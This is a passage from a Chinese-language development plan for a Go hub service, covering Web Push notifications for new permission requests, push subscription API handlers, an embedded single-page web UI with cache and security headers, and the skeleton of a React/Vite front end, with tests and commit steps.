	s       *Server
	enabled bool
	vapid   *push.VAPID
	client  *push.Client
	queue   chan store.Request
}

func newPushService(s *Server) (*pushService, error) {
	v, err := LoadOrCreateVAPID(s.store)
	if err != nil {
		return nil, err
	}
	p := &pushService{s: s, enabled: s.cfg.PublicURL != "", vapid: v, queue: make(chan store.Request, pushQueueSize)}
	p.client = &push.Client{HTTP: &http.Client{Timeout: pushSendTimeout}, VAPID: v, Subject: s.cfg.PublicURL}
	if !p.enabled {
		s.log.Printf("没有配置 --public-url，Web Push 停用")
	}
	return p, nil
}

// pushKinds 是会推送的请求种类；done 不推。
func pushKinds(kind string) bool { return kind == "permission" || kind == "webhook" || kind == "question" }

// announceNew 广播新请求给网页，并在推送启用时入队推送。
func (s *Server) announceNew(r store.Request) {
	s.clients.broadcast("request_new", s.view(r))
	if !s.push.enabled || !pushKinds(r.Kind) {
		return
	}
	select {
	case s.push.queue <- r:
	default:
		s.log.Printf("推送队列已满，丢弃请求 %q 的推送", r.ID)
	}
}

// run 逐条推送直到 ctx 取消。
func (p *pushService) run(ctx context.Context) {
	for {
		select {
		case r := <-p.queue:
			p.deliver(ctx, r)
		case <-ctx.Done():
			return
		}
	}
}

// payload 组推送内容：标题、正文、点开的路径。
func (p *pushService) payload(r store.Request) ([]byte, error) {
	v := p.s.view(r)
	where := v.MachineName
	if v.Project != "" {
		where += " · " + v.Project
	}
	var title, body string
	switch r.Kind {
	case "permission":
		title = where
		body = truncate(r.ToolName+": "+payloadSummary(r.Payload), pushSummaryLen) + " · 风险 " + r.Risk
	case "question":
		title = where + "：等你回答"
		body = truncate(r.Title, pushSummaryLen)
	default: // webhook
		title = "webhook"
		body = truncate(r.Title, pushSummaryLen)
	}
	return json.Marshal(map[string]string{"id": r.ID, "kind": r.Kind, "title": truncate(title, pushTitleLen), "body": body, "url": "/r/" + r.ID})
}

// payloadSummary 取载荷里最能说明这次操作的一段。
func payloadSummary(pl policy.Payload) string {
	switch pl.Type {
	case policy.PayloadShell:
		return strings.TrimSpace(pl.Command)
	case policy.PayloadFileWrite:
		return pl.Path
	case policy.PayloadNetwork:
		return pl.URL
	case policy.PayloadMCP:
		return strings.TrimSuffix(pl.Server+"/"+pl.Tool, "/")
	}
	return string(pl.Type)
}

// deliver 把一条请求推给全部订阅，按结果维护订阅，最后记一条审计。
func (p *pushService) deliver(ctx context.Context, r store.Request) {
	subs, err := p.s.store.ListPushSubscriptions()
	if err != nil {
		p.s.log.Printf("列推送订阅: %v", err)
		return
	}
	if len(subs) == 0 {
		return
	}
	msg, err := p.payload(r)
	if err != nil {
		p.s.log.Printf("组推送载荷 %q: %v", r.ID, err)
		return
	}
	var sent, gone, failed int
	for _, sub := range subs {
		switch p.sendOne(ctx, sub, msg, push.Options{TTL: 24 * time.Hour, Urgency: "high", Topic: r.ID}) {
		case pushOK:
			sent++
		case pushGone:
			gone++
		default:
			failed++
		}
	}
	p.s.audit(r.MachineID, "system", r.ID, "push_sent", map[string]int{"sent": sent, "gone": gone, "failed": failed})
}

type pushResult int

const (
	pushOK pushResult = iota
	pushGone
	pushFailed
)

// sendOne 推给一条订阅并按结果维护它：404/410 立即删；其他失败累计，连续 pushMaxFailures 次删。
func (p *pushService) sendOne(ctx context.Context, sub store.PushSubscription, msg []byte, o push.Options) pushResult {
	ps, err := push.ParseSubscription(sub.Endpoint, sub.P256dh, sub.Auth)
	if err != nil {
		p.s.log.Printf("订阅 %s 无法解析，删除: %v", sub.ID, err)
		p.removeSubscription(sub, "invalid")
		return pushGone
	}
	_, err = p.client.Send(ctx, ps, msg, o)
	switch {
	case err == nil:
		if err := p.s.store.MarkPushOK(sub.Endpoint); err != nil {
			p.s.log.Printf("记推送成功: %v", err)
		}
		return pushOK
	case errors.Is(err, push.ErrGone):
		p.removeSubscription(sub, "gone")
		return pushGone
	default:
		n, merr := p.s.store.MarkPushFailure(sub.Endpoint)
		if merr != nil {
			p.s.log.Printf("记推送失败: %v", merr)
		}
		p.s.log.Printf("推送到 %s 失败（第 %d 次）: %v", sub.ID, n, err)
		if n >= pushMaxFailures {
			p.removeSubscription(sub, "failures")
		}
		return pushFailed
	}
}

func (p *pushService) removeSubscription(sub store.PushSubscription, reason string) {
	if _, err := p.s.store.DeletePushSubscription(sub.Endpoint); err != nil {
		p.s.log.Printf("删推送订阅 %s: %v", sub.ID, err)
		return
	}
	p.s.audit("", "system", "", "push_subscription_removed", map[string]string{"id": sub.ID, "reason": reason})
}
```
（导入 `encoding/json`。`truncate` 是第 3 份 `requests.go` 里已有的按字符截断函数。）

`internal/hub/requests.go` 第 261 行、第 686 行附近和 `internal/hub/webhook.go` 第 164 行的 `s.clients.broadcast("request_new", s.view(x))` 都改为 `s.announceNew(x)`。

`internal/hub/api_push.go`:
```go
package hub

import (
	"context"
	"errors"
	"net/http"
	"time"

	"github.com/railse/railse-opc/internal/hub/push"
	"github.com/railse/railse-opc/internal/hub/store"
)

const (
	pushBodyMax     = 8 << 10
	pushUserAgentMax = 256
)

func (s *Server) pushRoutes() {
	read := s.requireClient
	write := func(h http.HandlerFunc) http.HandlerFunc { return sameOrigin(s.requireClient(h)) }
	s.mux.HandleFunc("GET /api/push/vapid", read(s.handlePushVapid))
	s.mux.HandleFunc("POST /api/push/subscribe", write(s.handlePushSubscribe))
	s.mux.HandleFunc("DELETE /api/push/subscribe", write(s.handlePushUnsubscribe))
	s.mux.HandleFunc("POST /api/push/check", write(s.handlePushCheck))
	s.mux.HandleFunc("POST /api/push/test", write(s.handlePushTest))
}

func (s *Server) handlePushVapid(w http.ResponseWriter, r *http.Request) {
	if !s.push.enabled {
		writeJSON(w, http.StatusOK, map[string]any{"enabled": false, "public_key": "", "reason": "hub 没有配置 --public-url，推送停用"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"enabled": true, "public_key": s.push.vapid.PublicKeyB64(), "reason": ""})
}

type subscribeBody struct {
	Endpoint string `json:"endpoint"`
	Keys     struct {
		P256dh string `json:"p256dh"`
		Auth   string `json:"auth"`
	} `json:"keys"`
}

func (s *Server) handlePushSubscribe(w http.ResponseWriter, r *http.Request) {
	if !s.push.enabled {
		writeErr(w, http.StatusServiceUnavailable, "hub 没有配置 --public-url，推送停用")
		return
	}
	var body subscribeBody
	if err := decodeJSON(w, r, pushBodyMax, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "请求体不是 JSON")
		return
	}
	if _, err := push.ParseSubscription(body.Endpoint, body.Keys.P256dh, body.Keys.Auth); err != nil {
		writeErr(w, http.StatusBadRequest, "订阅无效："+err.Error())
		return
	}
	if _, err := s.store.UpsertPushSubscription(body.Endpoint, body.Keys.P256dh, body.Keys.Auth, truncate(r.UserAgent(), pushUserAgentMax)); err != nil {
		s.internalErr(w, "登记推送订阅", err)
		return
	}
	s.audit("", "user", "", "push_subscribed", map[string]string{"endpoint_host": hostOf(body.Endpoint)})
	w.WriteHeader(http.StatusNoContent)
}

type endpointBody struct {
	Endpoint string `json:"endpoint"`
}

func (s *Server) handlePushUnsubscribe(w http.ResponseWriter, r *http.Request) {
	var body endpointBody
	if err := decodeJSON(w, r, pushBodyMax, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "请求体不是 JSON")
		return
	}
	if _, err := s.store.DeletePushSubscription(body.Endpoint); err != nil {
		s.internalErr(w, "删推送订阅", err)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *Server) handlePushCheck(w http.ResponseWriter, r *http.Request) {
	var body endpointBody
	if err := decodeJSON(w, r, pushBodyMax, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "请求体不是 JSON")
		return
	}
	_, err := s.store.GetPushSubscription(body.Endpoint)
	switch {
	case err == nil:
		writeJSON(w, http.StatusOK, map[string]bool{"active": true})
	case errors.Is(err, store.ErrNotFound):
		writeJSON(w, http.StatusOK, map[string]bool{"active": false})
	default:
		s.internalErr(w, "查推送订阅", err)
	}
}

func (s *Server) handlePushTest(w http.ResponseWriter, r *http.Request) {
	if !s.push.enabled {
		writeErr(w, http.StatusServiceUnavailable, "hub 没有配置 --public-url，推送停用")
		return
	}
	var body endpointBody
	if err := decodeJSON(w, r, pushBodyMax, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "请求体不是 JSON")
		return
	}
	sub, err := s.store.GetPushSubscription(body.Endpoint)
	if errors.Is(err, store.ErrNotFound) {
		writeErr(w, http.StatusNotFound, "没有这条订阅")
		return
	}
	if err != nil {
		s.internalErr(w, "查推送订阅", err)
		return
	}
	msg := []byte(`{"id":"test","kind":"test","title":"Railse","body":"通知正常","url":"/"}`)
	ctx, cancel := context.WithTimeout(r.Context(), pushSendTimeout)
	defer cancel()
	res := s.push.sendOne(ctx, sub, msg, push.Options{TTL: time.Minute, Urgency: "high"})
	s.audit("", "user", "", "push_test", map[string]any{"ok": res == pushOK})
	if res != pushOK {
		writeErr(w, http.StatusBadGateway, "推送端点拒绝了这次发送，订阅可能已失效，请重新开启通知")
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// hostOf 只取端点的 scheme://host 进审计，不记完整端点（端点本身等于一个可发送的地址）。
func hostOf(endpoint string) string {
	u, err := url.Parse(endpoint)
	if err != nil {
		return ""
	}
	return u.Scheme + "://" + u.Host
}
```
（导入 `net/url`。）

`internal/hub/api.go` 的 `handleStatus`：加 `"push_enabled": s.push.enabled, "push_subscriptions": n`（`n, _ := s.store.CountPushSubscriptions()`，出错记日志当 0）。

`cmd/railse/hub.go`：
- `hubUsage` 加 `railse hub run … [--public-url https://hub.example.com]` 与 `railse hub vapid [--dir 目录] [--rotate]   打印推送公钥；--rotate 换新密钥（所有手机要重新开启通知）`。
- `hubFlags["run"]` 加 `"public-url"`；加 `"vapid": {"dir", "rotate"}`。
- 标志：`publicURL := fs.String("public-url", "", "hub 对外的源，如 https://hub.example.com；不设则停用推送")`、`rotate := fs.Bool("rotate", false, "换新的 VAPID 密钥并删除全部推送订阅")`；`cfg.PublicURL = *publicURL`；`run` 前若 `cfg.PublicURL != ""` 先 `url.Parse` 校验是 `http(s)://host` 形式，不对则打印“--public-url 必须是 https://host 形式”退出 2。
- `switch sub` 加：
```go
	case "vapid":
		var v *push.VAPID
		var removed int
		var err error
		if *rotate {
			v, removed, err = hub.RotateVAPID(st)
		} else {
			v, err = hub.LoadOrCreateVAPID(st)
		}
		if err != nil {
			fmt.Fprintln(stderr, err)
			return 1
		}
		fmt.Fprintf(stdout, "公钥: %s\n", v.PublicKeyB64())
		if *rotate {
			fmt.Fprintf(stdout, "已换新密钥，删除了 %d 条推送订阅；所有手机要在网页里重新开启通知。\n", removed)
		}
```
（导入 `github.com/railse/railse-opc/internal/hub/push`。）
- `runHubServe` 启动日志加一行：推送启用与否（`--public-url` 有无）。

`docs/hub.md`：API 表加五个 `/api/push/*`；`/api/status` 加两字段；“启动”一节加 `--public-url` 与 `railse hub vapid`；“安全要点”加“VAPID 私钥与订阅密钥明文存库（设计 5.3 例外），永不经接口返回；`railse hub vapid --rotate` 换钥后所有手机重新开启通知”；“故障排查”加 `push_sent`、`push_subscription_removed` 审计的含义。

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./... && go test ./internal/hub/... ./cmd/railse/ -race`
Expected: 全部 PASS。`TestPushOnNewRequestAndCleanup` 里 5 次失败的推送各等 10 秒超时？不会：假端点立即回 500，不等超时。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/pushsvc.go internal/hub/api_push.go internal/hub/pushsvc_test.go internal/hub/server.go internal/hub/requests.go internal/hub/webhook.go internal/hub/api.go cmd/railse/hub.go cmd/railse/hub_test.go docs/hub.md
git commit -m "feat(hub): Web Push 订阅与发送，新请求推送到手机，失效订阅清理；--public-url 与 railse hub vapid"
```

---

### Task 6: hub 托管网页：嵌入构建产物、SPA 回退、缓存与安全头

**Files:**
- Create: `internal/hub/webui/webui.go`
- Create: `internal/hub/webui/webui_test.go`
- Create: `internal/hub/webui/dist/.gitkeep`
- Modify: `.gitignore`（加 `internal/hub/webui/dist/*` 与 `!internal/hub/webui/dist/.gitkeep`；删掉已有的 `web/dist/` 行）
- Modify: `internal/hub/server.go`（挂 `/`）
- Modify: `internal/hub/api_test.go`（根路径的测试）

**Interfaces:**
- 包 `webui`：`func FS() fs.FS`（嵌入的 `dist` 子树）；`func Handler(fsys fs.FS) http.Handler`
- `Handler` 行为：
  - 路径以 `/api/` 或 `/ws/` 开头 → 404 JSON `{"error":"没有这个接口"}`（mux 没匹配到的接口路径落到这里，不能回 index.html）
  - 路径对应 `fsys` 里的文件 → 原样返回：`/assets/` 下的（Vite 带哈希的产物）`Cache-Control: public, max-age=31536000, immutable`；其余文件（`index.html`、`sw.js`、`manifest.webmanifest`、图标）`Cache-Control: no-cache`
  - 其他路径（含 `/`、`/r/abc`、目录）→ `index.html`，200，`no-cache`
  - `fsys` 里没有 `index.html` → 503 纯文本“网页未构建：在仓库里运行 make web 后重新构建 railse”
  - 只接受 GET 与 HEAD，其余 405
  - 所有响应带 `X-Content-Type-Options: nosniff`、`Referrer-Policy: same-origin`、`X-Frame-Options: DENY`；HTML 响应带 `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; manifest-src 'self'; worker-src 'self'; frame-ancestors 'none'`
  - `.webmanifest` 的 `Content-Type` 为 `application/manifest+json`；`.js` 为 `text/javascript`

- [ ] **Step 1: 写失败的测试**

`internal/hub/webui/webui_test.go`:
```go
package webui

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"
)

func built() fstest.MapFS {
	return fstest.MapFS{
		"index.html":           {Data: []byte("<!doctype html><title>Railse</title><script type=module src=/assets/app.abc123.js></script>")},
		"assets/app.abc123.js": {Data: []byte("console.log(1)")},
		"assets/app.abc123.css": {Data: []byte("body{}")},
		"sw.js":                {Data: []byte("self.addEventListener('push',()=>{})")},
		"manifest.webmanifest": {Data: []byte(`{"name":"Railse"}`)},
		"icons/icon-192.png":   {Data: []byte("\x89PNG")},
	}
}

func get(t *testing.T, h http.Handler, method, path string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest(method, path, nil))
	return rec
}

func TestServesFilesAndFallsBackToIndex(t *testing.T) {
	h := Handler(built())
	for _, path := range []string{"/", "/r/abc", "/rules", "/assets/missing.js", "/index.html"} {
		rec := get(t, h, "GET", path)
		body, _ := io.ReadAll(rec.Body)
		if rec.Code != 200 || !strings.Contains(string(body), "<title>Railse</title>") {
			t.Fatalf("%s: %d %q", path, rec.Code, body)
		}
		if rec.Header().Get("Cache-Control") != "no-cache" || !strings.HasPrefix(rec.Header().Get("Content-Type"), "text/html") {
			t.Fatalf("%s 头: %v", path, rec.Header())
		}
		if !strings.Contains(rec.Header().Get("Content-Security-Policy"), "default-src 'self'") || rec.Header().Get("X-Frame-Options") != "DENY" {
			t.Fatalf("%s 安全头: %v", path, rec.Header())
		}
	}
	rec := get(t, h, "GET", "/assets/app.abc123.js")
	if rec.Code != 200 || rec.Header().Get("Cache-Control") != "public, max-age=31536000, immutable" || !strings.HasPrefix(rec.Header().Get("Content-Type"), "text/javascript") {
		t.Fatalf("资源: %d %v", rec.Code, rec.Header())
	}
	rec = get(t, h, "GET", "/sw.js")
	if rec.Code != 200 || rec.Header().Get("Cache-Control") != "no-cache" || rec.Header().Get("Content-Security-Policy") != "" {
		t.Fatalf("sw.js: %d %v", rec.Code, rec.Header())
	}
	rec = get(t, h, "GET", "/manifest.webmanifest")
	if rec.Code != 200 || rec.Header().Get("Content-Type") != "application/manifest+json" {
		t.Fatalf("manifest: %d %v", rec.Code, rec.Header())
	}
	rec = get(t, h, "HEAD", "/icons/icon-192.png")
	if rec.Code != 200 || rec.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("HEAD: %d %v", rec.Code, rec.Header())
	}
}

func TestAPIAndWSPathsNeverGetIndex(t *testing.T) {
	h := Handler(built())
	for _, path := range []string{"/api/nope", "/ws/nope", "/api/"} {
		rec := get(t, h, "GET", path)
		body, _ := io.ReadAll(rec.Body)
		if rec.Code != 404 || !strings.Contains(string(body), "没有这个接口") {
			t.Fatalf("%s: %d %q", path, rec.Code, body)
		}
	}
	if rec := get(t, h, "POST", "/"); rec.Code != 405 {
		t.Fatalf("POST: %d", rec.Code)
	}
}

func TestNotBuilt(t *testing.T) {
	h := Handler(fstest.MapFS{".gitkeep": {Data: nil}})
	rec := get(t, h, "GET", "/")
	body, _ := io.ReadAll(rec.Body)
	if rec.Code != 503 || !strings.Contains(string(body), "make web") {
		t.Fatalf("未构建: %d %q", rec.Code, body)
	}
}

func TestEmbeddedFSHasDist(t *testing.T) {
	// 没构建时 dist 里只有 .gitkeep；构建后有 index.html。两种都能打开。
	if _, err := FS().Open("."); err != nil {
		t.Fatal(err)
	}
}
```

`internal/hub/api_test.go` 追加：
```go
func TestRootServesWebUIOrNotBuilt(t *testing.T) {
	h := newTestHub(t)
	resp := doReq(t, "GET", h.http.URL+"/r/abc", nil, "", nil)
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("根路径: %d", resp.StatusCode)
	}
	if resp := doReq(t, "GET", h.http.URL+"/api/nope", nil, "", nil); resp.StatusCode != http.StatusNotFound {
		t.Fatalf("未知接口应 404: %d", resp.StatusCode)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/webui/`
Expected: FAIL，包不存在。

- [ ] **Step 3: 写实现**

`internal/hub/webui/dist/.gitkeep`：空文件。`.gitignore` 加：
```
internal/hub/webui/dist/*
!internal/hub/webui/dist/.gitkeep
```
并删掉 `web/dist/` 那行（Vite 直接输出到 `internal/hub/webui/dist`）。

`internal/hub/webui/webui.go`:
```go
// Package webui 把网页构建产物嵌进 hub 二进制并按单页应用的方式托管。
package webui

import (
	"embed"
	"io"
	"io/fs"
	"mime"
	"net/http"
	"path"
	"strings"
)

//go:embed all:dist
var dist embed.FS

// FS 返回嵌入的 dist 目录。没构建时只有 .gitkeep。
func FS() fs.FS {
	sub, err := fs.Sub(dist, "dist")
	if err != nil {
		panic(err) // dist 由 go:embed 保证存在
	}
	return sub
}

const (
	csp         = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; manifest-src 'self'; worker-src 'self'; frame-ancestors 'none'"
	notBuiltMsg = "网页未构建：在仓库里运行 make web 后重新构建 railse\n"
)

func init() {
	mime.AddExtensionType(".webmanifest", "application/manifest+json")
	mime.AddExtensionType(".js", "text/javascript")
}

// Handler 托管 fsys：文件原样返回，/assets/ 下的长期缓存；其余路径回 index.html；/api/、/ws/ 下没匹配到的接口回 404。
func Handler(fsys fs.FS) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		h := w.Header()
		h.Set("X-Content-Type-Options", "nosniff")
		h.Set("Referrer-Policy", "same-origin")
		h.Set("X-Frame-Options", "DENY")
		if r.Method != http.MethodGet && r.Method != http.MethodHead {
			h.Set("Allow", "GET, HEAD")
			http.Error(w, "只接受 GET", http.StatusMethodNotAllowed)
			return
		}
		p := path.Clean("/" + r.URL.Path)
		if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/ws/") || p == "/api" || p == "/ws" {
			h.Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			io.WriteString(w, `{"error":"没有这个接口"}`)
			return
		}
		name := strings.TrimPrefix(p, "/")
		if name != "" && name != "index.html" {
			if st, err := fs.Stat(fsys, name); err == nil && !st.IsDir() {
				if strings.HasPrefix(name, "assets/") {
					h.Set("Cache-Control", "public, max-age=31536000, immutable")
				} else {
					h.Set("Cache-Control", "no-cache")
				}
				serveFile(w, r, fsys, name)
				return
			}
		}
		if _, err := fs.Stat(fsys, "index.html"); err != nil {
			h.Set("Content-Type", "text/plain; charset=utf-8")
			w.WriteHeader(http.StatusServiceUnavailable)
			io.WriteString(w, notBuiltMsg)
			return
		}
		h.Set("Cache-Control", "no-cache")
		h.Set("Content-Security-Policy", csp)
		serveFile(w, r, fsys, "index.html")
	})
}

// serveFile 用 http.ServeFileFS 返回文件：它会按扩展名设 Content-Type、处理 HEAD 与 Range。
// 传入的路径已确认是文件，不会触发它对目录的重定向。
func serveFile(w http.ResponseWriter, r *http.Request, fsys fs.FS, name string) {
	// ServeFileFS 遇到 index.html 结尾的路径会重定向到目录，所以把请求路径改掉再交给它
	r2 := r.Clone(r.Context())
	r2.URL.Path = "/" + name
	if strings.HasSuffix(name, "/index.html") || name == "index.html" {
		r2.URL.Path = "/" + strings.TrimSuffix(name, "index.html")
	}
	http.ServeFileFS(w, r2, fsys, name)
}
```
（`http.ServeFileFS` 是 Go 1.22 加的。若它对 `index.html` 仍做重定向，改用 `fs.ReadFile` 读出内容后 `http.ServeContent(w, r, name, modTime, bytes.NewReader(b))`，`modTime` 取文件的 `ModTime()`。）

`internal/hub/server.go` 的 `routes()` 末尾加 `s.mux.Handle("/", webui.Handler(webui.FS()))`（导入 `github.com/railse/railse-opc/internal/hub/webui`）。Go 1.22 的 mux 里 `GET /api/status` 这类带方法与路径的模式比 `/` 更具体，接口路由不受影响；没注册的 `/api/x` 落到 `/`，由 `webui` 回 404。

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./... && go test ./internal/hub/... -race`
Expected: 全部 PASS。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/webui/ .gitignore internal/hub/server.go internal/hub/api_test.go
git commit -m "feat(hub): 嵌入并托管网页构建产物，单页回退、缓存与安全头，未构建时给提示"
```

---

### Task 7: 网页工程骨架：Vite + React + TypeScript、接口层、实时通道、状态、登录与外壳

**Files:**
- Create: `web/package.json`、`web/package-lock.json`（`npm install` 生成后入库）、`web/tsconfig.json`、`web/vite.config.ts`、`web/index.html`、`web/.gitignore`
- Create: `web/public/manifest.webmanifest`、`web/public/icons/gen.go`、`web/public/icons/icon-192.png`、`icon-512.png`、`apple-touch-icon-180.png`（由 `gen.go` 生成后入库）
- Create: `web/src/types.ts`、`src/api.ts`、`src/api.test.ts`、`src/ws.ts`、`src/ws.test.ts`、`src/store.ts`、`src/store.test.ts`、`src/StoreProvider.tsx`、`src/format.ts`、`src/format.test.ts`、`src/pwa.ts`、`src/pwa.test.ts`
- Create: `web/src/main.tsx`、`src/App.tsx`、`src/app.css`、`src/components/Banner.tsx`、`src/pages/Login.tsx`，以及 `src/pages/Inbox.tsx`、`Request.tsx`、`History.tsx`、`Rules.tsx`、`Machines.tsx`、`Settings.tsx` 的最小版本（只有标题，Task 8、9 替换成完整页面）

**Interfaces:**
- `api.ts`：`class ApiError extends Error { status: number }`；`setUnauthorizedHandler(fn: () => void)`；`hub` 对象：`login(password)`、`logout()`、`status()`、`inbox()`、`requests(state?, limit?)`、`request(id)`、`decide(id, {action, note, remember, scope})`、`propose(id, {action, scope})`、`rules()`、`setRuleEnabled(id, enabled)`、`deleteRule(id)`、`importRules(yaml)`、`exportRulesURL`、`machines()`、`revokeMachine(id)`、`pause()`、`resume()`、`pushVapid()`、`pushSubscribe(subJSON)`、`pushUnsubscribe(endpoint)`、`pushCheck(endpoint)`、`pushTest(endpoint)`；全部 `credentials: 'same-origin'`，非 2xx 抛 `ApiError(status, 服务端 error 文案)`，401 先调 unauthorized 回调
- `ws.ts`：`type Frame = { type: 'request_new' | 'request_updated' | 'rules_updated' | 'status'; data: unknown }`；`class Live { constructor(opts: LiveOptions); start(); stop() }`；`LiveOptions = { onFrame, onOpen, onDown(code?: number), makeSocket?: (url: string) => SocketLike, backoff?: number[] }`；重连退避 `[1000, 2000, 4000, 8000, 16000, 30000]`，连上归零；收到关闭码 1008（登录失效）不再重连并 `onDown(1008)`；`nextDelay(attempt, backoff)` 导出供测试
- `store.ts`：`State`、`Action`、`reduce(state, action)`、`initialState`；`StoreProvider.tsx`：`<StoreProvider>` 与 `useStore()`（返回 `{state, dispatch, reload}`），`reload()` 全量拉 `/api/inbox`、`/api/status`，并在页面需要时拉规则与机器
- `format.ts`：`relativeTime(iso, now = new Date())`、`riskLabel(risk)`、`riskTone(risk): 'low' | 'mid' | 'high'`、`payloadSummary(p)`、`stateLabel(state)`、`decidedByLabel(r)`、`kindLabel(kind)`
- `pwa.ts`：`isStandalone()`、`isIOS()`、`pushSupported()`、`urlBase64ToUint8Array(s)`、`registerServiceWorker()`、`getSubscription()`、`subscribe(publicKey)`
- 路由：`/login`、`/`（收件箱）、`/r/:id`、`/history`、`/rules`、`/machines`、`/settings`；`/login` 之外都包在 `RequireAuth` 里（首屏调 `/api/status`，401 跳 `/login?next=`）
- 开发：`npm run dev` 代理到 `RAILSE_HUB`（默认 `http://127.0.0.1:8787`）并把 `Origin` 改写成 hub 的源；`npm run build` 输出到 `../internal/hub/webui/dist` 并补回 `.gitkeep`

- [ ] **Step 1: 建工程并安装依赖**

```bash
mkdir -p web/src web/public/icons web/e2e
```
`web/package.json`:
```json
{
  "name": "railse-web",
  "private": true,
  "version": "0.1.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc --noEmit && vite build",
    "preview": "vite preview",
    "test": "vitest run",
    "check": "tsc --noEmit && vitest run",
    "e2e": "playwright test"
  },
  "dependencies": {
    "react": "^19.1.0",
    "react-dom": "^19.1.0",
    "react-router": "^7.6.0"
  },
  "devDependencies": {
    "@playwright/test": "^1.53.0",
    "@types/node": "^20.19.0",
    "@types/react": "^19.1.0",
    "@types/react-dom": "^19.1.0",
    "@vitejs/plugin-react": "^4.5.0",
    "typescript": "~5.8.0",
    "vite": "^7.0.0",
    "vitest": "^3.2.0"
  }
}
```
`web/tsconfig.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "lib": ["ES2022", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "moduleResolution": "bundler",
    "jsx": "react-jsx",
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "noFallthroughCasesInSwitch": true,
    "skipLibCheck": true,
    "isolatedModules": true,
    "noEmit": true,
    "types": ["vite/client", "node"]
  },
  "include": ["src", "e2e", "vite.config.ts", "playwright.config.ts"]
}
```
`web/.gitignore`:
```
node_modules/
test-results/
playwright-report/
.e2e/
```
`web/vite.config.ts`:
```ts
import { defineConfig } from 'vitest/config'
import react from '@vitejs/plugin-react'
import { writeFileSync } from 'node:fs'
import { resolve } from 'node:path'

const hub = process.env.RAILSE_HUB ?? 'http://127.0.0.1:8787'
const outDir = resolve(__dirname, '../internal/hub/webui/dist')

export default defineConfig({
  plugins: [
    react(),
    {
      // vite build 会清空 outDir，这里把 .gitkeep 补回去，构建后工作树不脏
      name: 'railse-keep-gitkeep',
      closeBundle() {
        writeFileSync(resolve(outDir, '.gitkeep'), '')
      },
    },
  ],
  build: { outDir, emptyOutDir: true },
  server: {
    // hub 的写接口与 /ws/client 校验 Origin 与 Host 相同，代理时把 Origin 改写成 hub 的源
    proxy: {
      '/api': { target: hub, changeOrigin: true, headers: { Origin: hub } },
      '/ws': { target: hub, ws: true, changeOrigin: true, headers: { Origin: hub } },
    },
  },
  test: { environment: 'node', include: ['src/**/*.test.ts'] },
})
```
`web/index.html`:
```html
<!doctype html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <meta name="theme-color" content="#1f2a44" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <meta name="apple-mobile-web-app-title" content="Railse" />
    <link rel="manifest" href="/manifest.webmanifest" />
    <link rel="apple-touch-icon" href="/icons/apple-touch-icon-180.png" />
    <link rel="icon" href="/icons/icon-192.png" />
    <title>Railse</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```
`web/public/manifest.webmanifest`:
```json
{
  "name": "Railse 一人公司",
  "short_name": "Railse",
  "start_url": "/",
  "scope": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#1f2a44",
  "icons": [
    { "src": "/icons/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icons/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "any maskable" }
  ]
}
```
`web/public/icons/gen.go`（`//go:build ignore`，用标准库画图标：深蓝圆角方块加白色的“R”竖杠与半圆）:
```go
//go:build ignore

// 生成 PWA 图标：go run gen.go（在 web/public/icons 目录下运行）。
package main

import (
	"image"
	"image/color"
	"image/png"
	"os"
)

func draw(size int) *image.RGBA {
	img := image.NewRGBA(image.Rect(0, 0, size, size))
	bg := color.RGBA{0x1f, 0x2a, 0x44, 0xff}
	fg := color.RGBA{0xff, 0xff, 0xff, 0xff}
	r := size / 5 // 圆角半径
	for y := 0; y < size; y++ {
		for x := 0; x < size; x++ {
			// 圆角：四角圆外的点透明
			cx, cy := x, y
			if x < r {
				cx = r
			} else if x >= size-r {
				cx = size - r - 1
			}
			if y < r {
				cy = r
			} else if y >= size-r {
				cy = size - r - 1
			}
			dx, dy := x-cx, y-cy
			if dx*dx+dy*dy > r*r {
				continue
			}
			img.Set(x, y, bg)
		}
	}
	// 字母 R 的简化画法：竖杠 + 上半圆环 + 斜腿
	stem := size / 9
	left, top, bottom := size*3/10, size/4, size*3/4
	for y := top; y < bottom; y++ {
		for x := left; x < left+stem; x++ {
			img.Set(x, y, fg)
		}
	}
	cxr, cyr := left+stem, top+size/8
	outer, inner := size/8, size/8-stem
	for y := cyr - outer; y <= cyr+outer; y++ {
		for x := cxr; x <= cxr+outer; x++ {
			d := (x-cxr)*(x-cxr) + (y-cyr)*(y-cyr)
